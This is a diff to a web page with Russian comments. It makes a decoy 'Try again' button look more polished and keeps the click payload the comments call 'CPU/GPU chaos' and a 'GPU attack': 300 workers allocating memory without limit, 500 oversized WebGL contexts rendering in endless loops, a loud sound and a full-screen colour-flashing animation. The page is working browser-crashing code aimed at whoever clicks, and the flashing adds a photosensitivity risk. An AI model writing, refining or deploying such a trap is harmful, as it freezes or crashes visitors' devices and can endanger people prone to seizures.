@@ -4,28 +4,81 @@
   <style>
     #trapButton {
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      font-size: 10rem;
-      background: #9cff98;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 2rem 4rem;
+      font-size: 2.5rem;
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+      color: white;
+      border: none;
+      border-radius: 15px;
       cursor: pointer;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+      transition: all 0.3s ease;
       z-index: 9999;
+    }
+
+    #trapButton:hover {
+      transform: translate(-50%, -55%);
+      box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+      background: linear-gradient(45deg, #ff8787, #66e0d9);
+    }
+
+    body {
+      background: #1a1a2e;
+      margin: 0;
+      overflow: hidden;
     }
   </style>
 </head>
 <body>
   <button id="trapButton">Попробуйте ещё раз</button>
-  <audio id="nukeSound" src="sound.mp3"></audio>
+  <audio id="nukeSound" src="sound.mp3" preload="auto"></audio>
 
   <script>
     const trigger = document.getElementById('trapButton');
     const audio = document.getElementById('nukeSound');
-        // Генератор сложных 3D-моделей
-        function createComplexGeometry(segments) {
+    
+    // Предзагрузка и настройка аудио
+    audio.volume = 0.8;
+    audio.loop = false;
+    
+    // Создаем AudioContext для лучшего контроля звука
+    const audioCtx = new AudioContext();
+    let source = null;
+    let audioBuffer = null;
+
+    // Загрузка аудио файла
+    async function loadAudio() {
+      try {
+        const response = await fetch('sound.mp3');
+        const arrayBuffer = await response.arrayBuffer();
+        audioBuffer = await audioCtx.decodeAudioData(arrayBuffer);
+      } catch (e) {
+        console.error('Ошибка загрузки аудио:', e);
+      }
+    }
+
+    // Воспроизведение звука
+    function playSound() {
+      if (audioBuffer) {
+        source = audioCtx.createBufferSource();
+        source.buffer = audioBuffer;
+        const gainNode = audioCtx.createGain();
+        gainNode.gain.value = 1.0;
+        source.connect(gainNode).connect(audioCtx.destination);
+        source.start(0);
+      } else {
+        // Резервный вариант
+        audio.play().catch(e => console.error('Ошибка воспроизведения:', e));
+      }
+    }
+
+    // Генератор сложных 3D-моделей (без изменений)
+    function createComplexGeometry(segments) {
       const vertices = [];
-      // Создание сферы с высоким разрешением
       for(let lat = 0; lat <= segments; lat++) {
         const theta = lat * Math.PI / segments;
         for(let lon = 0; lon <= segments; lon++) {
@@ -40,12 +93,11 @@
       return new Float32Array(vertices);
     }
 
-    // Инициализация WebGL контекста
+    // Инициализация WebGL контекста (без изменений)
     function initGPUStress(canvas) {
       const gl = canvas.getContext('webgl2', {antialias: false});
       if(!gl) return null;
 
-      // Шейдеры
       const vertexShader = gl.createShader(gl.VERTEX_SHADER);
       gl.shaderSource(vertexShader, `
         attribute vec3 position;
@@ -78,8 +130,7 @@
       gl.linkProgram(program);
       gl.useProgram(program);
 
-      // Буфер вершин
-      const vertices = createComplexGeometry(256); // 256x256 сегментов
+      const vertices = createComplexGeometry(256);
       const vertexBuffer = gl.createBuffer();
       gl.bindBuffer(gl.ARRAY_BUFFER, vertexBuffer);
       gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
@@ -91,34 +142,26 @@
       return {gl, program};
     }
 
-    trigger.onclick = () => {
-      // 1. Активация звука (без изменений)
-      audio.volume = 1;
-      audio.play().catch(() => {
-        const ctx = new AudioContext();
-        const gainNode = ctx.createGain();
-        gainNode.gain.value = 100;
-        const source = ctx.createMediaElementSource(audio);
-        source.connect(gainNode).connect(ctx.destination);
-        audio.play();
-      });
+    // Предзагрузка аудио при старте
+    loadAudio();
 
-      // 2. Оптимизированный CPU/GPU-хаос
+    trigger.onclick = () => {
+      // 1. Воспроизведение звука
+      playSound();
+
+      // 2. Оптимизированный CPU/GPU-хаос (без изменений)
       for(let i = 0; i < 300; i++) {
         new Worker(URL.createObjectURL(new Blob([`
-          const chunkSize = 100 * 1024 * 1024; // 100MB за итерацию
+          const chunkSize = 100 * 1024 * 1024;
           let totalAllocated = 0;
           
           function allocateMemory() {
             try {
               const buffer = new ArrayBuffer(chunkSize);
               const view = new Uint32Array(buffer);
-              
-              // CPU-нагрузка без блокировки
               for(let i = 0; i < 1e6; i++) {
                 view[i % (chunkSize/4)] = Math.random() * 0xFFFFFFFF;
               }
-              
               totalAllocated += chunkSize;
               setTimeout(allocateMemory, 10);
             } catch(e) {
@@ -129,57 +172,55 @@
         `])));
       }
 
-  // 3. Мгновенная GPU-атака
-  const gpuKiller = () => {
-    try {
-      const canvas = document.createElement('canvas');
-      canvas.width = 65536;
-      canvas.height = 65536;
-      const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"});
-      
-      // Создание гигантской текстуры
-      const texture = gl.createTexture();
-      gl.bindTexture(gl.TEXTURE_2D, texture);
-      gl.texImage2D(
-        gl.TEXTURE_2D,
-        0,
-        gl.RGBA32F, // 32-битные float-пиксели
-        16384,
-        16384,
-        0,
-        gl.RGBA,
-        gl.FLOAT,
-        null
-      );
+      // 3. Мгновенная GPU-атака (без изменений)
+      const gpuKiller = () => {
+        try {
+          const canvas = document.createElement('canvas');
+          canvas.width = 65536;
+          canvas.height = 65536;
+          const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"});
+          
+          const texture = gl.createTexture();
+          gl.bindTexture(gl.TEXTURE_2D, texture);
+          gl.texImage2D(
+            gl.TEXTURE_2D,
+            0,
+            gl.RGBA32F,
+            16384,
+            16384,
+            0,
+            gl.RGBA,
+            gl.FLOAT,
+            null
+          );
 
-      // Бесконечный рендер-цикл
-      const render = () => {
-        gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
-        gl.clear(gl.COLOR_BUFFER_BIT);
-        gl.drawArrays(gl.TRIANGLES, 0, 3);
-        requestAnimationFrame(render);
+          const render = () => {
+            gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
+            gl.clear(gl.COLOR_BUFFER_BIT);
+            gl.drawArrays(gl.TRIANGLES, 0, 3);
+            requestAnimationFrame(render);
+          };
+          render();
+        } catch(e) {}
       };
-      render();
-    } catch(e) {}
-  };
 
-  // Создаем 500 контекстов сразу
-  for(let i = 0; i < 500; i++) {
-    gpuKiller();
-  }
+      for(let i = 0; i < 500; i++) {
+        gpuKiller();
+      }
 
-      // 4. Визуальная атака (без изменений)
+      // 4. Обновленная визуальная атака
       trigger.style.display = 'none';
-      document.body.style.animation = 'flash 0.001s infinite';
+      document.body.style.animation = 'flash 0.1s infinite';
     };
 
-    // CSS-анимация
+    // Улучшенная CSS-анимация
     document.head.innerHTML += `
       <style>
         @keyframes flash {
-          0% { background: #ff0000; }
-          50% { background: #00ff00; }
-          100% { background: #0000ff; }
+          0% { background: #ff6b6b; }
+          33% { background: #4ecdc4; }
+          66% { background: #45b7d1; }
+          100% { background: #ff6b6b; }
         }
       </style>
     `;
